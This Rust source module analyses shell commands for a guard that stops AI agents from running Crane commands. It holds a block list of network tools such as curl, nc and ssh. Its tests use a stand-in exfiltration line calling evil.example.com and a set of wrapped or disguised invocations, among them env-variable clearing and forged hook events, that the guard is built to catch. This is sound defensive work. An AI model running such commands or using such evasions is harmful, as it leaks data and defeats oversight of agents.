// Shell command analysis used by the guard and the telemetry: splitting a command into words,
// recognizing Crane invocations (agents may run none),
// the shell words and Git subcommands that change files, network tools, references to the .crane
// directory, and network destinations named in commands or arguments. Analysis is lexical and
// conservative: it reports what a command names, never what it would do once run.

use std::collections::BTreeSet;

/** The words that follow 'crane' when it is run: every command and the options that print help or
 * the version (an agent may run none of them) */
pub(super) const CRANE_COMMANDS: &[&str] = &[
    "init",
    "checkpoint",
    "protect",
    "target",
    "--set",
    "parse",
    "validate",
    "test",
    "add",
    "policy-context",
    "create",
    "policy",
    "repo",
    "data",
    "github",
    "task",
    "session",
    "agent",
    "integrate",
    "alert",
    "admin",
    "governance",
    "foxx",
    "server",
    "help",
    "--help",
    "-h",
    "--version",
    "-v",
];

/** Shell words that change files */
pub(super) const MUTATING_WORDS: &[&str] = &[
    "rm",
    "del",
    "erase",
    "rmdir",
    "rd",
    "mv",
    "move",
    "ren",
    "rename",
    "cp",
    "copy",
    "xcopy",
    "robocopy",
    "tee",
    "truncate",
    "dd",
    "patch",
    "remove-item",
    "move-item",
    "copy-item",
    "set-content",
    "add-content",
    "out-file",
    "new-item",
    "clear-content",
    "rename-item",
    "ri",
    "mi",
    "ci",
    "sc",
    "ac",
    "install",
    "ln",
    "chmod",
    "unlink",
    "shred",
];

/** Git subcommands that change work-tree files */
pub(super) const MUTATING_GIT: &[&str] = &[
    "checkout",
    "restore",
    "rm",
    "mv",
    "reset",
    "apply",
    "stash",
    "am",
    "revert",
    "cherry-pick",
    "merge",
    "rebase",
    "pull",
    "switch",
    "clean",
];

/** Shell words that reach the network */
pub(super) const NETWORK_WORDS: &[&str] = &[
    "curl",
    "wget",
    "invoke-webrequest",
    "iwr",
    "invoke-restmethod",
    "irm",
    "nc",
    "ncat",
    "netcat",
    "telnet",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "ftp",
    "http",
    "https",
];

/** Normalize text for path matching: "/" separators, lowercase
 * Input
    - text: &str - path or command
 * Output
    - String
*/
pub(super) fn normal(text: &str) -> String {
    text.replace('\\', "/").to_ascii_lowercase()
}

/** Check whether text names .crane as a whole path component (so my.crane or .craneignore do
 * not match), or the trust directory by its default name
 * Input
    - text: &str - normalized text
 * Output
    - bool
*/
pub(super) fn names_crane_directory(text: &str) -> bool {
    let name_character =
        |character: char| character.is_ascii_alphanumeric() || "_-.".contains(character);
    text.contains(".crane-trust")
        || text.contains("crane_home")
        || text.match_indices(".crane").any(|(start, _)| {
            let before = text[..start].chars().next_back();
            let after = text[start + ".crane".len()..].chars().next();
            !before.is_some_and(|character| character.is_ascii_alphanumeric() || character == '_')
                && !after.is_some_and(name_character)
        })
}

/** Split a shell command into words, treating shell separators and quotes as boundaries
 * Input
    - command: &str - command text
 * Output
    - Vec<String> lowercase words
*/
pub(crate) fn words(command: &str) -> Vec<String> {
    command
        .split(|character: char| character.is_whitespace() || "&|;()`\"'<>{}".contains(character))
        .filter(|word| !word.is_empty())
        .map(normal)
        .collect()
}

/** Find a Crane invocation anywhere in a shell command, a script, or inline code: a program named
 * crane or crane.exe (bare, by a Unix or Windows path, after env assignments, wrappers such as
 * sudo, env, npx, xargs, cmd /c, or PowerShell's call operator, inside quotes passed to bash -c,
 * or as an argument list such as ["crane", "init"]) followed by one of Crane's commands. Agents
 * may run none of them, read-only ones included, and not the hook entry points either (typing
 * 'crane agent hook' would forge hook events). Mentions such as 'cargo build -p crane' or a
 * directory named crane are not invocations
 * Input
    - text: &str - command, script, or code text
 * Output
    - Option<String> the invocation, None when Crane is not run
*/
pub(crate) fn crane_invocation(text: &str) -> Option<String> {
    let tokens = text
        .split(|character: char| {
            character.is_whitespace() || ";|&()`\"'{}[],<>=+".contains(character)
        })
        .filter(|token| !token.is_empty())
        .map(|token| token.to_ascii_lowercase())
        .collect::<Vec<_>>();
    for (index, token) in tokens.iter().enumerate() {
        let program = token.rsplit(['/', '\\']).next().unwrap_or_default();
        if program != "crane" && program != "crane.exe" {
            continue;
        }
        // 'cargo run -p crane -- init' runs Crane too
        let rest = tokens[index + 1..]
            .iter()
            .skip_while(|word| word.as_str() == "--")
            .collect::<Vec<_>>();
        if rest
            .first()
            .is_some_and(|word| CRANE_COMMANDS.contains(&word.as_str()))
        {
            return Some(format!(
                "crane {}",
                rest.iter()
                    .take(3)
                    .map(|word| word.as_str())
                    .collect::<Vec<_>>()
                    .join(" ")
            ));
        }
    }
    None
}

/** Infer network destinations from a command or argument list: URLs, user@host targets of
 * ssh-like tools, and Git remote operations; marked inferred, never observed
 * Input
    - texts: &[String] - command words or tool arguments
 * Output
    - Vec<String> destinations (hosts or URLs without query strings)
*/
pub(crate) fn network_destinations(texts: &[String]) -> Vec<String> {
    let mut found = BTreeSet::new();
    for text in texts {
        for (start, _) in text.match_indices("://") {
            let scheme_start = text[..start]
                .rfind(|character: char| !character.is_ascii_alphanumeric())
                .map_or(0, |index| index + 1);
            let scheme = &text[scheme_start..start];
            if !matches!(
                scheme.to_ascii_lowercase().as_str(),
                "http" | "https" | "ftp" | "ws" | "wss" | "ssh"
            ) {
                continue;
            }
            let rest = &text[start + 3..];
            let host = rest
                .split(|character: char| "/?#\"' ".contains(character))
                .next()
                .unwrap_or_default()
                .rsplit('@')
                .next()
                .unwrap_or_default();
            if !host.is_empty() {
                found.insert(format!("{}://{host}", scheme.to_ascii_lowercase()));
            }
        }
    }
    let joined = words(&texts.join(" "));
    for (index, word) in joined.iter().enumerate() {
        if matches!(word.as_str(), "ssh" | "scp" | "sftp" | "rsync") {
            if let Some(target) = joined[index + 1..].iter().find(|word| word.contains('@')) {
                let host = target
                    .split('@')
                    .nth(1)
                    .unwrap_or_default()
                    .split(':')
                    .next()
                    .unwrap_or_default();
                if !host.is_empty() {
                    found.insert(format!("ssh://{host}"));
                }
            }
        }
        if word == "git"
            && matches!(
                joined.get(index + 1).map(String::as_str),
                Some("push" | "pull" | "fetch" | "clone" | "ls-remote")
            )
        {
            found.insert("git-remote".into());
        }
        if matches!(
            word.as_str(),
            "npm" | "pnpm" | "yarn" | "pip" | "pip3" | "cargo" | "go" | "gem"
        ) && matches!(
            joined.get(index + 1).map(String::as_str),
            Some("install" | "i" | "add" | "get" | "update" | "publish")
        ) {
            found.insert(format!("package-registry:{word}"));
        }
    }
    found.into_iter().collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    /** Check the detection of governance commands, protected names, and network destinations
     * Input
        - None
     * Output
        - None (panics on failure)
    */
    #[test]
    fn detects_commands_and_destinations() {
        // Every Crane command is an invocation, read-only ones and the hook entry points included
        for command in [
            "crane protect a.py",
            "cd x && ./target/debug/crane.exe checkpoint v2",
            "crane --set default policy x",
            "crane agent uninstall --profile claude",
            "crane test . && crane validate --json",
            "crane policy payments status",
            "crane --version",
            "crane agent hook --event pre-tool-use --profile claude",
            "& \"C:\\tools\\crane.exe\" init",
            "C:\\tools\\crane_v0_4_22\\crane.exe validate",
            "env CLAUDECODE= crane init",
            "sudo -E crane governance sign",
            "npx crane checkpoint x",
            "echo y | xargs crane admin add KEY",
            "bash -c \"crane repo rebind github.com/a/b\"",
            "cmd /c crane checkpoint x",
            "cargo run -p crane -- init",
            "subprocess.run([\"crane\", \"protect\", \"a.py\"])",
        ] {
            assert!(crane_invocation(command).is_some(), "{command}");
        }
        // Mentions are not invocations
        for command in [
            "cargo build -p crane",
            "cd crane && make",
            "ls crane/src",
            "git commit -m \"crane: faster hooks\"",
            "cat crane-mvp/README.md",
        ] {
            assert!(crane_invocation(command).is_none(), "{command}");
        }
        assert!(names_crane_directory("cat ./.crane/map"));
        assert!(names_crane_directory(
            "type c:/users/me/.crane-trust/keys/x.key"
        ));
        assert!(!names_crane_directory("cat docs/my.crane.md"));
        assert!(!names_crane_directory("cat .craneignore"));
        let destinations = network_destinations(&[
            "curl -s https://evil.example.com/x?d=1 && ssh git@host.io".into(),
        ]);
        assert!(destinations.contains(&"https://evil.example.com".to_string()));
        assert!(destinations.contains(&"ssh://host.io".to_string()));
    }
}
